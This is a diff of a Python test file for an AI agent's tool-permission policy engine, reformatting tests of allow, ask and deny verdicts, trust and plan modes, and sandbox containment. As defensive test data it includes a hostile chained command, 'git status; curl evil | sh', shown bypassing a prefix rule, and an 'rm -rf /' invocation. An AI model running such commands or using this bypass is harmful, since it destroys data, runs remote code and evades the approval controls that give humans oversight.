@@ -59,7 +59,9 @@ def _invocation(
 # ── Containment fact helper ──────────────────────────────────────────────
 
 
-def _identity(workspace: str = "workspace", user: str = "user", plan: str = "plan", surface: str = "surface"):
+def _identity(
+    workspace: str = "workspace", user: str = "user", plan: str = "plan", surface: str = "surface"
+):
     return SimpleNamespace(
         workspace_id=workspace,
         user_slug=user,
@@ -109,8 +111,13 @@ def test_ask_beats_allow() -> None:
 
 def test_allow_matches_command_prefix() -> None:
     policy = PolicyDocument(allow=[PolicyRule(tool="bash_run", command_prefix="git status")])
-    assert decide(policy=policy, invocation=_invocation(command="git status")).verdict == VERDICT_ALLOW
-    assert decide(policy=policy, invocation=_invocation(command="git status --short")).verdict == VERDICT_ALLOW
+    assert (
+        decide(policy=policy, invocation=_invocation(command="git status")).verdict == VERDICT_ALLOW
+    )
+    assert (
+        decide(policy=policy, invocation=_invocation(command="git status --short")).verdict
+        == VERDICT_ALLOW
+    )
     # A different subcommand does not match the prefix rule.
     assert decide(policy=policy, invocation=_invocation(command="git push")).verdict == VERDICT_ASK
 
@@ -131,12 +138,16 @@ def test_empty_rule_matches_nothing() -> None:
 def test_tool_and_effect_matchers() -> None:
     policy = PolicyDocument(allow=[PolicyRule(tool="write_file", effect="write")])
     assert (
-        decide(policy=policy, invocation=_invocation(effect="write", target_id="write_file")).verdict
+        decide(
+            policy=policy, invocation=_invocation(effect="write", target_id="write_file")
+        ).verdict
         == VERDICT_ALLOW
     )
     # Same tool, different effect does not match the effect-scoped rule.
     assert (
-        decide(policy=policy, invocation=_invocation(effect="execute", target_id="write_file")).verdict
+        decide(
+            policy=policy, invocation=_invocation(effect="execute", target_id="write_file")
+        ).verdict
         == VERDICT_ASK
     )
 
@@ -145,7 +156,9 @@ def test_tool_and_effect_matchers() -> None:
 
 
 def test_read_effect_never_prompts_in_ask_mode() -> None:
-    decision = decide(policy=PolicyDocument(), invocation=_invocation(effect="read", target_id="recall"))
+    decision = decide(
+        policy=PolicyDocument(), invocation=_invocation(effect="read", target_id="recall")
+    )
     assert decision.verdict == VERDICT_ALLOW
     assert decision.tier == "read"
 
@@ -160,8 +173,16 @@ def test_trust_mode_allows_execute_and_write_but_prompts_external_write() -> Non
     policy = PolicyDocument(mode=PolicyMode.TRUST)
     # A bare (unsandboxed) execute prompts even in TRUST mode: the bare guard
     # overrides the silent allow by default (bare_requires_approval=True).
-    assert decide(policy=policy, invocation=_invocation(effect="execute", command="make")).verdict == VERDICT_ASK
-    assert decide(policy=policy, invocation=_invocation(effect="write", target_id="write_file")).verdict == VERDICT_ALLOW
+    assert (
+        decide(policy=policy, invocation=_invocation(effect="execute", command="make")).verdict
+        == VERDICT_ASK
+    )
+    assert (
+        decide(
+            policy=policy, invocation=_invocation(effect="write", target_id="write_file")
+        ).verdict
+        == VERDICT_ALLOW
+    )
     # external_write never auto-approves, even in trust mode.
     ext = decide(
         policy=policy, invocation=_invocation(effect="external_write", target_id="github_open_pr")
@@ -172,15 +193,29 @@ def test_trust_mode_allows_execute_and_write_but_prompts_external_write() -> Non
 def test_trust_mode_allows_bare_execute_when_guard_disabled() -> None:
     """Turning the bare guard off restores TRUST's silent allow for execute."""
     policy = PolicyDocument(mode=PolicyMode.TRUST, bare_requires_approval=False)
-    assert decide(policy=policy, invocation=_invocation(effect="execute", command="make")).verdict == VERDICT_ALLOW
+    assert (
+        decide(policy=policy, invocation=_invocation(effect="execute", command="make")).verdict
+        == VERDICT_ALLOW
+    )
 
 
 def test_plan_mode_denies_all_effectful() -> None:
     policy = PolicyDocument(mode=PolicyMode.PLAN)
-    assert decide(policy=policy, invocation=_invocation(effect="write", target_id="write_file")).verdict == VERDICT_DENY
-    assert decide(policy=policy, invocation=_invocation(effect="execute", command="ls")).verdict == VERDICT_DENY
+    assert (
+        decide(
+            policy=policy, invocation=_invocation(effect="write", target_id="write_file")
+        ).verdict
+        == VERDICT_DENY
+    )
+    assert (
+        decide(policy=policy, invocation=_invocation(effect="execute", command="ls")).verdict
+        == VERDICT_DENY
+    )
     # but reads are still allowed (deny ladder only gates effectful actions)
-    assert decide(policy=policy, invocation=_invocation(effect="read", target_id="recall")).verdict == VERDICT_ALLOW
+    assert (
+        decide(policy=policy, invocation=_invocation(effect="read", target_id="recall")).verdict
+        == VERDICT_ALLOW
+    )
 
 
 # ── Sandbox-as-boundary downgrade ────────────────────────────────────────
@@ -211,7 +246,9 @@ def test_unknown_containment_prompts(tmp_path: Path) -> None:
 
 def test_degraded_containment_prompts_with_reason(tmp_path: Path) -> None:
     identity = _identity()
-    _write_containment(tmp_path, identity, "degraded", reasons=["bubblewrap (bwrap) binary not found on PATH"])
+    _write_containment(
+        tmp_path, identity, "degraded", reasons=["bubblewrap (bwrap) binary not found on PATH"]
+    )
     decision = decide(
         policy=PolicyDocument(),
         invocation=_invocation(command="ls", identity=identity),
@@ -298,7 +335,9 @@ def test_external_write_not_downgraded_even_when_contained(tmp_path: Path) -> No
     _write_containment(tmp_path, _identity(), "contained")
     decision = decide(
         policy=PolicyDocument(),
-        invocation=_invocation(effect="external_write", target_id="github_open_pr", identity=_identity()),
+        invocation=_invocation(
+            effect="external_write", target_id="github_open_pr", identity=_identity()
+        ),
         data_dir=tmp_path,
     )
     assert decision.verdict == VERDICT_ASK
@@ -432,9 +471,7 @@ def test_when_only_rule_fires() -> None:
 
 def test_when_ands_with_structural_matchers() -> None:
     """All present matchers AND the expression must hold."""
-    policy = PolicyDocument(
-        allow=[PolicyRule(tool="bash_run", when='action.argv[0] == "git"')]
-    )
+    policy = PolicyDocument(allow=[PolicyRule(tool="bash_run", when='action.argv[0] == "git"')])
     assert decide(policy=policy, invocation=_invocation(command="git status")).verdict == (
         VERDICT_ALLOW
     )
@@ -459,9 +496,7 @@ def test_when_closes_the_command_prefix_bypass() -> None:
     ``command_prefix: git status`` matches ``git status; curl evil | sh``
     (a plain startswith); the equivalent ``when`` over argv tokens does not.
     """
-    prefix_policy = PolicyDocument(
-        allow=[PolicyRule(tool="bash_run", command_prefix="git status")]
-    )
+    prefix_policy = PolicyDocument(allow=[PolicyRule(tool="bash_run", command_prefix="git status")])
     when_policy = PolicyDocument(
         allow=[
             PolicyRule(
@@ -482,12 +517,8 @@ def test_when_closes_the_command_prefix_bypass() -> None:
 
 def test_when_uses_argv_parameter_directly() -> None:
     """A tool carrying an argv vector exposes its tokens without shlex."""
-    policy = PolicyDocument(
-        allow=[PolicyRule(tool="bwrap_run", when='!("rm" in action.argv)')]
-    )
-    invocation = _invocation(
-        command="", target_id="bwrap_run", parameters={"argv": ["ls", "-la"]}
-    )
+    policy = PolicyDocument(allow=[PolicyRule(tool="bwrap_run", when='!("rm" in action.argv)')])
+    invocation = _invocation(command="", target_id="bwrap_run", parameters={"argv": ["ls", "-la"]})
     assert decide(policy=policy, invocation=invocation).verdict == VERDICT_ALLOW
     hostile = _invocation(
         command="", target_id="bwrap_run", parameters={"argv": ["rm", "-rf", "/"]}
@@ -568,9 +599,7 @@ def test_when_binds_identity() -> None:
 
 
 def test_when_binds_effect_and_pack() -> None:
-    policy = PolicyDocument(
-        deny=[PolicyRule(when='action.effect == "external_write"')]
-    )
+    policy = PolicyDocument(deny=[PolicyRule(when='action.effect == "external_write"')])
     assert (
         decide(
             policy=policy,
@@ -578,9 +607,7 @@ def test_when_binds_effect_and_pack() -> None:
         ).verdict
         == VERDICT_DENY
     )
-    assert decide(policy=policy, invocation=_invocation(effect="write")).verdict == (
-        VERDICT_ASK
-    )
+    assert decide(policy=policy, invocation=_invocation(effect="write")).verdict == (VERDICT_ASK)
 
 
 def test_load_policy_when_compile_error_fails_closed(tmp_path: Path) -> None:
